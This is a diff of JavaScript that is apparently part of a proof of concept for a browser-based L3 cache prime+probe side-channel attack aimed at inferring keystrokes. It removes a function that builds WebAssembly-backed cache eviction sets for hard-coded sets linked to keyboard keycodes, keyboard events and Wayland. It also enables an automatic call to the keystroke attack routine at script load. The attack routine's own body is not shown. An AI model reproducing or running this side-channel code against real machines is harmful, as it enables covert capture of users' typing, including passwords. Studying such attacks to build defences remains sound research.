@@ -750,44 +750,5 @@ async function l3pp_keystrokes_poc(){
     await stopTimer();
 }
 
-async function simulate_keystrokes(){
-    const {module, memory} = await getAccessModules();
-    const instance = new WebAssembly.Instance(module, {env: {mem: memory}});
-    const buffer = new Uint32Array(memory.buffer);
-    let {wasm_hit, wasm_miss} = instance.exports;
-
-    // Avoid allocate-on-write optimizations
-    buffer.fill(1);
-    buffer.fill(0);
-
-    await startTimer();
-
-    // Build eviction sets
-
-    self.importScripts('evsets/main.js');
-    
-    const KBD_KEYCODE_SET = 366;
-    const KEYCODE_SLICE = 3;
-    const KBD_KEYCODE_VICTIM = KBD_KEYCODE_SET*LINE_SIZE;
-    log(`set: ${KBD_KEYCODE_SET}, slice: ${KEYCODE_SLICE}`)
-
-    keycode_found_sets = await find_evsets_all_slices(KBD_KEYCODE_VICTIM, module, memory, buffer, 0);
-    log(keycode_found_sets);
-
-    const KBD_EVENT_SET = 413;
-    const EVENT_SLICE = 3;
-    const KBD_EVENT_VICTIM = KBD_EVENT_SET*LINE_SIZE;
-    log(`set: ${KBD_EVENT_SET}, slice: ${EVENT_SLICE}`)
-    event_found_sets = await find_evsets_all_slices(KBD_EVENT_VICTIM, module, memory, buffer, 1);
-    log(event_found_sets);
-
-    const WAYLAND_SET = 1746;
-    const WAYLAND_SLICE = 3;
-    const WAYLAND_VICTIM = WAYLAND_SET * LINE_SIZE;
-    log(`set: ${WAYLAND_SET}, slice: ${WAYLAND_SLICE}`)
-    wayland_found_sets = await find_evsets_all_slices(WAYLAND_VICTIM, module, memory, buffer, 2);
-    log(wayland_found_sets);
-}
-
-// l3pp_keystrokes_poc()
+l3pp_keystrokes_poc()
 
